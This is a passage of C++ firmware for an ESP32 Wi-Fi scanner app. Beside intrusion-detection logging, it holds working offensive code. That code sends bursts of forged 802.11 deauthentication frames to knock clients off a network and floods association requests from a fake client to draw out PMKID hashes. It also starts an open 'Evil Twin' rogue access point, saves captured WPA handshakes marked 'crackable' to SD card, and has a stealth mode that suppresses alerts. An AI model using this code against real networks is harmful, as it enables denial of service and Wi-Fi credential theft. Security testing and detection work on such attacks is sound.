        }
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        g_hopChannel.store(channel);
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_captureStopped.store(true);
    vTaskDelete(nullptr);
    return 0;
}

void startCapture(Context* ctx) {
    if (g_captureRunning.load()) return;
    g_captureCtx.store(ctx);
    g_captureStopped.store(false);
    g_hopChannel.store(0);
    g_captureRunning.store(true);
    xTaskCreatePinnedToCore(
        [](void* arg) { hopTask(arg); },
        "wifi_hop", 3072, nullptr, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

void stopWidsPcapLogging();

void stopCapture(Context* ctx) {
    if (!g_captureRunning.load()) return;
    g_lockChannel.store(0);
    g_captureRunning.store(false);
    for (int i = 0; i < 100 && !g_captureStopped.load(); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    g_captureCtx.store(nullptr);
    if (ctx != nullptr && ctx->widsPcapEnabled.load()) {
        stopWidsPcapLogging();
        ctx->widsPcapEnabled.store(false);
    }
}

void startRadioIfNeeded(Context* ctx) {
    if (!g_captureRunning.load()) {
        startCapture(ctx);
    }
}

void stopRadioIfNeither(Context* ctx) {
    if (!ctx->widsActive && !ctx->hopActive && !ctx->reconActive) {
        stopCapture(ctx);
    }
}

bool isCaptureSupported() { return true; }

void setCaptureLockChannel(int ch) { g_lockChannel.store(ch); }
int getCaptureLockChannel() { return g_lockChannel.load(); }
int getCurrentRadioChannel() { return g_hopChannel.load(); }

constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
constexpr int DEAUTH_BURST_SETS = 6;
constexpr int DEAUTH_FRAMES_PER_SET = 6;
constexpr int DEAUTH_FRAME_GAP_MS = 50;
constexpr int DEAUTH_SET_GAP_MS = 200;

constexpr int ASSOC_BURST_SETS = 6;
constexpr int ASSOC_FRAMES_PER_SET = 6;
constexpr int ASSOC_FRAME_GAP_MS = 50;
constexpr int ASSOC_SET_GAP_MS = 200;

std::string macToString(const uint8_t* mac) {
    char text[18];
    snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return text;
}

void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* bssid) {
    uint8_t frame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0x00, 0x00,
        0x07, 0x00,
    };
    memcpy(frame + 4, addr1, 6);
    memcpy(frame + 10, addr2, 6);
    memcpy(frame + 16, bssid, 6);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    if (err != ESP_OK) {
        LOG_W(TAG, "deauth: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
    }
}

struct DeauthTaskParams {
    uint8_t bssid[6];
    uint8_t client[6];
    bool hasClient;
    int channel;
};

void deauthBurstTask(void* arg) {
    auto* params = static_cast<DeauthTaskParams*>(arg);
    
    int i = 0;
    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    const uint8_t* target = params->hasClient ? params->client : BROADCAST_MAC;
    std::string bssidStr = macToString(params->bssid);
    std::string targetStr = macToString(target);

    for (int set = 0; set < DEAUTH_BURST_SETS; set++) {
        LOG_I(TAG, "deauth: burst %d/%d ch%d | BSSID: %s -> Target: %s", 
            set + 1, DEAUTH_BURST_SETS, params->channel, bssidStr.c_str(), targetStr.c_str());
        for (int f = 0; f < DEAUTH_FRAMES_PER_SET; f++) {
            sendDeauthFrame(target, params->bssid, params->bssid);
            if (params->hasClient) {
                sendDeauthFrame(params->bssid, params->client, params->bssid);
            }
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
        }
        if (set < DEAUTH_BURST_SETS - 1) {
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_SET_GAP_MS));
        }
    }

    delete params;
    vTaskDelete(nullptr);
}

void sendDeauthBurstOnChannel(const uint8_t* bssid, int channel, const uint8_t* client = nullptr) {
    auto* params = new DeauthTaskParams{};
    memcpy(params->bssid, bssid, 6);
    if (client != nullptr) {
        memcpy(params->client, client, 6);
        params->hasClient = true;
    } else {
        params->hasClient = false;
    }
    params->channel = channel;

    xTaskCreatePinnedToCore(deauthBurstTask, "wifi_deauth", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

void sendAssociationRequest(const uint8_t* bssid, const char* ssid, const uint8_t* fakeClient) {
    int ssidLen = ssid ? strlen(ssid) : 0;
    if (ssidLen > 32) ssidLen = 32;

    uint8_t frame[64] = {0};
    frame[0] = 0x00;
    frame[1] = 0x00;
    frame[2] = 0x3a;
    frame[3] = 0x01;
    memcpy(frame + 4, bssid, 6);
    memcpy(frame + 10, fakeClient, 6);
    memcpy(frame + 16, bssid, 6);

    frame[24] = 0x31;
    frame[25] = 0x01;
    frame[26] = 0x0a;
    frame[27] = 0x00;

    int idx = 28;
    frame[idx++] = 0;
    frame[idx++] = ssidLen;
    if (ssidLen > 0) {
        memcpy(frame + idx, ssid, ssidLen);
        idx += ssidLen;
    }

    frame[idx++] = 1;
    frame[idx++] = 8;
    uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    memcpy(frame + idx, rates, 8);
    idx += 8;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, idx, true);
    if (err != ESP_OK) {
        LOG_W(TAG, "assoc_req: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
    }
}

struct AssocTaskParams {
    uint8_t bssid[6];
    char ssid[33];
    int channel;
};

void assocBurstTask(void* arg) {
    auto* params = static_cast<AssocTaskParams*>(arg);

    int i = 0;
    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    uint8_t fakeClient[6] = {0x02, 0xDE, 0xAD, 0xBE, 0xEF, 0x01};
    std::string bssidStr = macToString(params->bssid);
    std::string clientStr = macToString(fakeClient);

    for (int set = 0; set < ASSOC_BURST_SETS; set++) {
        LOG_I(TAG, "assoc_req (PMKID): burst %d/%d ch%d | FakeClient: %s -> AP BSSID: %s (SSID: '%s')", 
            set + 1, ASSOC_BURST_SETS, params->channel, clientStr.c_str(), bssidStr.c_str(), params->ssid);
        for (int j = 0; j < ASSOC_FRAMES_PER_SET; j++) {
            sendAssociationRequest(params->bssid, params->ssid, fakeClient);
            vTaskDelay(pdMS_TO_TICKS(ASSOC_FRAME_GAP_MS));
        }
        if (set < ASSOC_BURST_SETS - 1) {
            vTaskDelay(pdMS_TO_TICKS(ASSOC_SET_GAP_MS));
        }
    }

    delete params;
    vTaskDelete(nullptr);
}

void sendAssociationRequestBurst(const uint8_t* bssid, const char* ssid, int channel) {
    auto* params = new AssocTaskParams{};
    memcpy(params->bssid, bssid, 6);
    if (ssid) {
        strncpy(params->ssid, ssid, sizeof(params->ssid) - 1);
    }
    params->channel = channel;

    xTaskCreatePinnedToCore(assocBurstTask, "wifi_assoc", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

// ---- Evil Twin / Rogue AP & PCAP functions ----

static bool g_stealth_mode = false;
static bool& g_tactical_mode = g_stealth_mode;
static FILE* g_etPcapFile = nullptr;
static RecursiveMutex g_etPcapMutex;
static std::atomic<uint32_t> g_etPacketsLogged{0};

void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); }
void pcapU16(FILE* f, uint16_t v) { fwrite(&v, 2, 1, f); }

void pcapRecord(FILE* f, const uint8_t* data, int len) {
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    pcapU32(f, (uint32_t)tv.tv_sec);
    pcapU32(f, (uint32_t)tv.tv_usec);
    pcapU32(f, (uint32_t)len);
    pcapU32(f, (uint32_t)len);
    fwrite(data, 1, len, f);
}

bool startEvilTwinLogging(const char* ssid) {
    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return false;
    if (g_etPcapFile != nullptr) {
        g_etPcapMutex.unlock();
        return true;
    }
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/eviltwin", 0777);

    char safe[33];
    int j = 0;
    for (int i = 0; ssid && ssid[i] != '\0' && j < 32; i++) {
        char c = ssid[i];
        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
    }
    safe[j] = '\0';

    char path[128];
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%s.pcap",
            safe[0] != '\0' ? safe : "eviltwin", timeStr);
    } else {
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%lu.pcap",
            safe[0] != '\0' ? safe : "eviltwin", (unsigned long)(esp_timer_get_time() / 1000000));
    }

    g_etPcapFile = fopen(path, "wb");
    if (g_etPcapFile != nullptr) {
        pcapU32(g_etPcapFile, 0xA1B2C3D4);
        pcapU16(g_etPcapFile, 2); pcapU16(g_etPcapFile, 4);
        pcapU32(g_etPcapFile, 0); pcapU32(g_etPcapFile, 0);
        pcapU32(g_etPcapFile, 65535);
        pcapU32(g_etPcapFile, 105);
        fflush(g_etPcapFile);
        g_etPacketsLogged.store(0);
        LOG_I(TAG, "Evil Twin PCAP recording started: %s", path);
    } else {
        LOG_E(TAG, "Failed to create Evil Twin PCAP: %s", path);
    }
    g_etPcapMutex.unlock();
    return g_etPcapFile != nullptr;
}

void stopEvilTwinLogging() {
    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return;
    if (g_etPcapFile != nullptr) {
        fflush(g_etPcapFile);
        fclose(g_etPcapFile);
        g_etPcapFile = nullptr;
        LOG_I(TAG, "Evil Twin PCAP closed. Total packets logged: %u", (unsigned)g_etPacketsLogged.load());
    }
    g_etPcapMutex.unlock();
}

void logEvilTwinPacket(const uint8_t* payload, int len) {
    if (g_etPcapFile == nullptr) return;
    if (g_etPcapMutex.lock(0)) {
        if (g_etPcapFile != nullptr) {
            pcapRecord(g_etPcapFile, payload, len);
            uint32_t count = g_etPacketsLogged.fetch_add(1) + 1;
            if ((count % 10) == 0) {
                fflush(g_etPcapFile);
            }
        }
        g_etPcapMutex.unlock();
    }
}

// ---- WIDS Sentinel Intrusion Detection Logging ----

static FILE* g_widsPcapFile = nullptr;
static RecursiveMutex g_widsPcapMutex;
static std::atomic<uint32_t> g_widsPacketsLogged{0};

bool startWidsPcapLogging() {
    if (!g_widsPcapMutex.lock(500 / portTICK_PERIOD_MS)) return false;
    if (g_widsPcapFile != nullptr) {
        g_widsPcapMutex.unlock();
        return true;
    }
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/wids", 0777);
    char path[128];
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/wids/wids_%s.pcap", timeStr);
    } else {
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/wids/wids_%lu.pcap",
            (unsigned long)(esp_timer_get_time() / 1000000));
    }
    g_widsPcapFile = fopen(path, "wb");
    if (g_widsPcapFile != nullptr) {
        pcapU32(g_widsPcapFile, 0xA1B2C3D4);
        pcapU16(g_widsPcapFile, 2); pcapU16(g_widsPcapFile, 4);
        pcapU32(g_widsPcapFile, 0); pcapU32(g_widsPcapFile, 0);
        pcapU32(g_widsPcapFile, 65535);
        pcapU32(g_widsPcapFile, 105);
        fflush(g_widsPcapFile);
        g_widsPacketsLogged.store(0);
        LOG_I(TAG, "WIDS PCAP recording started: %s", path);
    } else {
        LOG_E(TAG, "Failed to create WIDS PCAP: %s", path);
    }
    g_widsPcapMutex.unlock();
    return g_widsPcapFile != nullptr;
}

void stopWidsPcapLogging() {
    if (!g_widsPcapMutex.lock(500 / portTICK_PERIOD_MS)) return;
    if (g_widsPcapFile != nullptr) {
        fflush(g_widsPcapFile);
        fclose(g_widsPcapFile);
        g_widsPcapFile = nullptr;
        LOG_I(TAG, "WIDS PCAP closed. Total packets: %u", (unsigned)g_widsPacketsLogged.load());
    }
    g_widsPcapMutex.unlock();
}

void logWidsPacket(const uint8_t* payload, int len) {
    if (g_widsPcapFile == nullptr) return;
    if (g_widsPcapMutex.lock(0)) {
        if (g_widsPcapFile != nullptr) {
            pcapRecord(g_widsPcapFile, payload, len);
            uint32_t count = g_widsPacketsLogged.fetch_add(1) + 1;
            if ((count % 10) == 0) {
                fflush(g_widsPcapFile);
            }
        }
        g_widsPcapMutex.unlock();
    }
}

void logWidsAttackToSd(const WidsEvent& ev) {
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/wids", 0777);
    FILE* f = fopen("/sdcard/wifi-scanner/wids/wids_attacks.log", "a");
    if (f == nullptr) return;
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    char timeStr[32] = "N/A";
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &tm_info);
    } else {
        snprintf(timeStr, sizeof(timeStr), "+%lu s", (unsigned long)(ev.timestampMs / 1000));
    }
    fprintf(f, "[%s] [%s] %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | Ch: %d | Rate: %u/s\n",
        timeStr, widsAttackToString(ev.type), ev.desc,
        ev.bssid[0], ev.bssid[1], ev.bssid[2], ev.bssid[3], ev.bssid[4], ev.bssid[5],
        ev.channel, (unsigned)ev.rate);
    fclose(f);
}

void triggerWidsAlert(Context* ctx, WidsAttackType type, const char* desc, const uint8_t* bssid, int channel, uint16_t rate) {
    WidsEvent ev{};
    ev.timestampMs = lv_tick_get();
    ev.type = type;
    strlcpy(ev.desc, desc, sizeof(ev.desc));
    if (bssid != nullptr) memcpy(ev.bssid, bssid, 6);
    ev.channel = channel;
    ev.rate = rate;

    if (ctx->mutex.lock(100 / portTICK_PERIOD_MS)) {
        ctx->widsEvents.push_front(ev);
        if (ctx->widsEvents.size() > 30) ctx->widsEvents.pop_back();
        ctx->widsTotalAttacks++;
        ctx->widsActiveThreat.store(type);
        ctx->widsThreatClearTick = lv_tick_get() + 3500;

        uint32_t now = lv_tick_get();
        ctx->widsMostSevereThreat.store(type);
        ctx->widsSevereThreatTimestampMs = now;
        ctx->mutex.unlock();
    }

    if (ctx->widsLogFileEnabled.load()) {
        logWidsAttackToSd(ev);
    }

    if (!g_tactical_mode) {
        namespace np = service::neopixel;
        if (type == WidsAttackType::DeauthFlood) {
            np::setActiveColor(255, 0, 0); // Strobe Red
        } else {
            np::setActiveColor(255, 120, 0); // Orange
        }
    }
}

void startEvilTwinAp(const char* ssid, int channel) {
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (netif == nullptr) {
        esp_netif_create_default_wifi_ap();
    }
    wifi_config_t ap_config = {};
    strlcpy(reinterpret_cast<char*>(ap_config.ap.ssid), ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen(ssid);
    ap_config.ap.channel = channel;
    ap_config.ap.max_connection = 8;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    LOG_I(TAG, "Evil Twin Rogue AP started: SSID='%s' on ch%d", ssid, channel);
}

void stopEvilTwinAp() {
    stopEvilTwinLogging();
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    } else if (mode == WIFI_MODE_AP) {
        esp_wifi_stop();
    }
    LOG_I(TAG, "Evil Twin Rogue AP stopped");
}

constexpr auto* EAPOL_BEEP_PATH = "/data/wifiscanner/eapol_beep.mp3";
constexpr int EAPOL_BEEP_MAX_WAIT_MS = 1200;
constexpr int FADE_STEP_MS = 25;
constexpr int FADE_STEP_DB = 4;
constexpr int DUCK_FLOOR_DB = -20;

static std::atomic<bool> g_soundTaskRunning{false};

void eapolSoundTask(void* /*arg*/) {
    using namespace tt::service::music;
    if (isAvailable()) {
        Telemetry telemetry = getTelemetry();
        int trackIndex = getTrackIndex();
        bool wasPlaying = telemetry.state == State::Playing && trackIndex >= 0;
        uint32_t savedPosition = telemetry.positionSeconds;
        int originalGain = getGainDb();

        if (wasPlaying) {
            for (int g = originalGain; g > DUCK_FLOOR_DB; g -= FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(DUCK_FLOOR_DB);
            playPause();
            setGainDb(originalGain);
        }

        enqueueAndPlay(EAPOL_BEEP_PATH);
        // Wait for player to transition from Stopped/Idle to Playing (up to 250ms)
        for (int w = 0; w < 10; w++) {
            vTaskDelay(pdMS_TO_TICKS(25));
            if (getTelemetry().state == State::Playing) break;
        }
        // Wait for playback to complete (up to 1200ms)
        for (int waited = 0; waited < EAPOL_BEEP_MAX_WAIT_MS; waited += 40) {
            vTaskDelay(pdMS_TO_TICKS(40));
            auto tel = getTelemetry();
            if (tel.state == State::Stopped || tel.finished) break;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
        removeFromQueueByPath(EAPOL_BEEP_PATH);

        if (wasPlaying) {
            setGainDb(DUCK_FLOOR_DB);
            playQueueIndex(trackIndex);
            seek(savedPosition);
            for (int g = DUCK_FLOOR_DB; g < originalGain; g += FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(originalGain);
        }
    }
    g_soundTaskRunning.store(false);
    vTaskDelete(nullptr);
}

void triggerEapolSound() {
    bool expected = false;
    if (!g_soundTaskRunning.compare_exchange_strong(expected, true)) {
        return; // An eapol sound is already playing
    }
    xTaskCreate([](void* arg) { eapolSoundTask(arg); }, "wifiscanner_beep", 4096, nullptr,
        tskIDLE_PRIORITY + 1, nullptr);
}

bool savePcap(const HandshakeCapture& hc, uint64_t bssidKeyVal) {
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/handshakes", 0777);
    char safe[33];
    int j = 0;
    for (int i = 0; hc.ssid[i] != '\0' && j < 32; i++) {
        char c = hc.ssid[i];
        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
    }
    safe[j] = '\0';
    char path[128];
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX_%s.pcap",
            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal, timeStr);
    } else {
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX.pcap",
            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal);
    }

    FILE* f = fopen(path, "wb");
    if (f == nullptr) return false;
    pcapU32(f, 0xA1B2C3D4);
    pcapU16(f, 2); pcapU16(f, 4);
    pcapU32(f, 0); pcapU32(f, 0);
    pcapU32(f, 65535);
    pcapU32(f, 105);
    if (hc.beaconLen > 0) pcapRecord(f, hc.beacon, hc.beaconLen);
    for (int s = 0; s < 4; s++) {
        if (hc.eapolLen[s] > 0) pcapRecord(f, hc.eapol[s], hc.eapolLen[s]);
    }
    fclose(f);
    return true;
}

#else

void startCapture(Context*) {}
void stopCapture(Context*) {}
void startRadioIfNeeded(Context*) {}
void stopRadioIfNeither(Context*) {}
bool isCaptureSupported() { return false; }
void setCaptureLockChannel(int) {}
int getCaptureLockChannel() { return 0; }
int getCurrentRadioChannel() { return 0; }
void sendDeauthBurst(const uint8_t*, const uint8_t*) {}
void sendDeauthBurstOnChannel(const uint8_t*, int, const uint8_t* = nullptr) {}
void sendAssociationRequestBurst(const uint8_t*, const char*, int) {}
void startEvilTwinAp(const char*, int) {}
void stopEvilTwinAp() {}
bool startEvilTwinLogging(const char*) { return false; }
void stopEvilTwinLogging() {}
void logEvilTwinPacket(const uint8_t*, int) {}
bool startWidsPcapLogging() { return false; }
void stopWidsPcapLogging() {}
void logWidsPacket(const uint8_t*, int) {}
void logWidsAttackToSd(const WidsEvent&) {}
void triggerWidsAlert(Context*, WidsAttackType, const char*, const uint8_t*, int, uint16_t) {}

#endif

void flushHandshakes(Context* ctx) {
#ifdef ESP_PLATFORM
    auto ready = std::make_unique<HandshakeCapture>();
    uint64_t key = 0;
    bool have = false;
    if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
        for (auto& [k, hc] : ctx->handshakes) {
            bool crackable = ((hc.msgMask & 0x03) == 0x03) || hc.hasPmkid;
            if (crackable && !hc.saved) {
                *ready = hc;
                key = k;
                hc.saved = true;
                have = true;
                break;
            }
        }
        ctx->mutex.unlock();
    }
    if (have) {
        triggerEapolSound();
        if (savePcap(*ready, key)) {
            if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
                ctx->handshakesSaved++;
                ctx->mutex.unlock();
            }
        }
    }
#else
    (void)ctx;
#endif
}

const char* authToString(WifiAuthenticationType type) {
    switch (type) {
        case WIFI_AUTHENTICATION_TYPE_OPEN: return "OPEN";
        case WIFI_AUTHENTICATION_TYPE_WEP: return "WEP";
        case WIFI_AUTHENTICATION_TYPE_WPA_PSK: return "WPA";
        case WIFI_AUTHENTICATION_TYPE_WPA2_PSK: return "WPA2";
        case WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTHENTICATION_TYPE_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return "WPA3";
        case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return "WPA2/3";
        default: return "?";
    }
}

const char* cipherToString(WifiCipherType cipher) {
    switch (cipher) {
        case WIFI_AP_CIPHER_NONE: return "nessuna";
        case WIFI_AP_CIPHER_WEP: return "WEP";
        case WIFI_AP_CIPHER_TKIP: return "TKIP";
        case WIFI_AP_CIPHER_CCMP: return "CCMP (AES)";
        case WIFI_AP_CIPHER_TKIP_CCMP: return "TKIP+CCMP";
        case WIFI_AP_CIPHER_GCMP: return "GCMP";
        default: return "sconosciuta (solo cattura)";
    }
}

std::string phyToString(uint8_t flags) {
    std::string result;
    if (flags & WIFI_AP_PHY_11B) result += "b";
    if (flags & WIFI_AP_PHY_11G) result += "g";
    if (flags & WIFI_AP_PHY_11N) result += "n";
    if (flags & WIFI_AP_PHY_11AX) result += "ax";
    if (flags & WIFI_AP_PHY_WPS) result += " WPS";
    return result.empty() ? "?" : ("802.11" + result);
}

const char* displaySsid(const WifiApRecord& record) {
    return record.ssid[0] != '\0' ? record.ssid : "(nascosta)";
}

int frequencyMhz(int channel) { return 2407 + 5 * channel; }

float estimateDistanceMeters(int8_t rssi) {
    constexpr float txPowerAt1m = -40.0f;
    constexpr float pathLossExponent = 2.5f;
    return std::pow(10.0f, (txPowerAt1m - (float)rssi) / (10.0f * pathLossExponent));
}

bool isRadioUsable() {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    return state == On || state == ConnectionPending || state == ConnectionActive;
}

void connectTo(Context* ctx, const std::string& ssid) {
    service::wifi::settings::WifiApSettings settings;
    if (service::wifi::settings::load(ssid, settings)) {
        service::wifi::connect(settings, false);
    } else {
        wificonnect::start(ssid);
    }
    (void)ctx;
}

void fillBell(lv_obj_t* chart, lv_chart_series_t* series, int channel, int8_t rssi) {
    int32_t values[CHART_POINTS];
    int32_t height = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
    float step = (CH_AXIS_MAX - CH_AXIS_MIN) / (CHART_POINTS - 1);
    for (int i = 0; i < CHART_POINTS; i++) {
        float x = CH_AXIS_MIN + step * i;
        float distance = std::fabs(x - (float)channel) / BELL_HALF_WIDTH;
        values[i] = distance < 1.0f ? (int32_t)(height * (1.0f - distance * distance)) : 0;
    }
    lv_chart_set_series_values(chart, series, values, CHART_POINTS);
}

std::vector<SeenAp> sortedByRssi(Context* ctx) {
    std::vector<SeenAp> result;
    uint64_t now = nowMs();
    for (auto it = ctx->seen.begin(); it != ctx->seen.end();) {
        if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
            it = ctx->seen.erase(it);
        } else {
            result.push_back(it->second);
            ++it;
        }
    }
    std::sort(result.begin(), result.end(), [](const SeenAp& a, const SeenAp& b) {
        return a.record.rssi > b.record.rssi;
    });
    return result;
}

void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
    uint64_t now = nowMs();
    for (const auto& record : records) {
        uint64_t key = bssidKey(record.bssid);
        auto it = ctx->seen.find(key);
        if (it == ctx->seen.end()) {
            SeenAp ap{};
            ap.record = record;
            sanitizeAscii(ap.record.ssid);
            ap.firstSeenMs = now;
            ap.lastSeenMs = now;
            ap.rssiMin = ap.rssiMax = record.rssi;
            ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
            if (record.authentication_type == WIFI_AUTHENTICATION_TYPE_WPA3_PSK) {
                ap.pmf = PmfState::Required;
            } else if (record.authentication_type == WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK) {
                ap.pmf = PmfState::Capable;
            } else {
                ap.pmf = PmfState::None;
            }
            ctx->seen.emplace(key, ap);

            // WIDS detection: verifica presenza di Rogue AP clonato con sicurezza o canale diverso
            if (ap.record.ssid[0] != '\0') {
                for (const auto& [k, existingAp] : ctx->seen) {
                    if (k != key && existingAp.record.ssid[0] != '\0' &&
                        strcmp(ap.record.ssid, existingAp.record.ssid) == 0 &&
                        (existingAp.record.authentication_type != ap.record.authentication_type || existingAp.record.channel != ap.record.channel)) {
                        bool fromMe = isPacketFromMe(ctx, ap.record.bssid, ap.record.bssid, (int)ap.record.channel);
                        if (!ctx->widsFilterSelf || !fromMe) {
                            char alertMsg[64];
                            snprintf(alertMsg, sizeof(alertMsg), "Rogue AP clonato: %s", ap.record.ssid);
                            triggerWidsAlert(ctx, WidsAttackType::RogueApClone, alertMsg, ap.record.bssid, (int)ap.record.channel, 1);
                            break;
                        }
                    }
                }
            }
        } else {
            SeenAp& ap = it->second;
            ap.record = record;
            sanitizeAscii(ap.record.ssid);
            ap.fromCapture = false;
            ap.lastSeenMs = now;
            ap.rssiMin = std::min(ap.rssiMin, record.rssi);
            ap.rssiMax = std::max(ap.rssiMax, record.rssi);
            if (ap.pmf == PmfState::None) {
                if (record.authentication_type == WIFI_AUTHENTICATION_TYPE_WPA3_PSK) {
                    ap.pmf = PmfState::Required;
                } else if (record.authentication_type == WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK) {
                    ap.pmf = PmfState::Capable;
                }
            }
        }
    }
}

void saveLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    ctx->savedAnim = np::getActiveAnimation();
    ctx->savedColorMode = np::getActiveColorMode();
    np::getActiveColor(&ctx->savedR, &ctx->savedG, &ctx->savedB);
    ctx->savedBrightness = np::getActiveBrightness();
    ctx->savedSpeed = np::getActiveSpeed();
    ctx->savedVuActive = np::isVuActive();
    ctx->savedVuDecay = np::isVuDecayEnabled();
    ctx->savedVuAutoGain = np::isVuAutoGainEnabled();
    ctx->savedVuBeatFlash = np::isVuBeatFlashEnabled();
    ctx->savedVuPeakHold = np::isVuPeakHoldEnabled();
    ctx->savedVuPalette = np::getVuPalette();
    ctx->savedVuOrigin = np::getVuOrigin();
    np::getVuColor(&ctx->savedVuR, &ctx->savedVuG, &ctx->savedVuB);
    ctx->savedVuBrightness = np::getVuBrightness();
    ctx->savedVuSensitivity = np::getVuSensitivity();
    ctx->ledSaved = true;
}

void restoreLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    if (!ctx->ledSaved) return;
    np::setVuPalette(ctx->savedVuPalette);
    np::setVuOrigin(ctx->savedVuOrigin);
    np::setVuColor(ctx->savedVuR, ctx->savedVuG, ctx->savedVuB);
    np::setVuBrightness(ctx->savedVuBrightness);
    np::setVuSensitivity(ctx->savedVuSensitivity);
    np::setVuDecayEnabled(ctx->savedVuDecay);
    np::setVuAutoGainEnabled(ctx->savedVuAutoGain);
    np::setVuBeatFlashEnabled(ctx->savedVuBeatFlash);
    np::setVuPeakHoldEnabled(ctx->savedVuPeakHold);
    np::setVuActive(ctx->savedVuActive);
    np::setActiveColorMode(ctx->savedColorMode);
    np::setActiveColor(ctx->savedR, ctx->savedG, ctx->savedB);
    np::setActiveSpeed(ctx->savedSpeed);
    np::setActiveBrightness(ctx->savedBrightness);
    np::setActiveAnimation(ctx->savedAnim);
}

static uint8_t g_saved_backlight_duty = 200;
static Context* g_active_scanner_ctx = nullptr;

static Device* getDisplayBacklight() {
    Device* display = nullptr;
